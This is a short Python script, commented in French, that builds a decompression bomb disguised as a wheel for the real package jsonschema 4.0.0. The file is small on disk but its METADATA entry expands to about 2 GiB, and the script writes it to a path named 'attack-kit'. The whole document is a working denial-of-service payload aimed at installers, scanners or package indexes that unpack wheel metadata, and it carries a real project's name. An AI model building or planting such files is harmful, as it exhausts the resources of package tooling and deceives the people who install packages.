#!/usr/bin/env python3
"""Construit une roue piegee : petite sur disque, ~2 Gio de METADATA decompressee."""
import sys, zipfile, pathlib
out = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else "/tmp/attack-kit/jsonschema-4.0.0-py3-none-any.whl")
out.parent.mkdir(parents=True, exist_ok=True)
CHUNK = b"A" * (1 << 20)          # 1 MiB
TIMES = 2048                       # -> 2 GiB decompressed
with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
    zi = zipfile.ZipInfo("jsonschema-4.0.0.dist-info/METADATA")
    zi.compress_type = zipfile.ZIP_DEFLATED
    with z.open(zi, "w", force_zip64=True) as fh:
        fh.write(b"Name: jsonschema\nVersion: 4.0.0\n")
        for _ in range(TIMES):
            fh.write(CHUNK)
    z.writestr("jsonschema-4.0.0.dist-info/WHEEL", "Wheel-Version: 1.0\n")
    z.writestr("jsonschema-4.0.0.dist-info/RECORD", "x\n")
info = zipfile.ZipFile(out).getinfo("jsonschema-4.0.0.dist-info/METADATA")
print(f"{out}  on-disk={out.stat().st_size}  decompressed={info.file_size}")
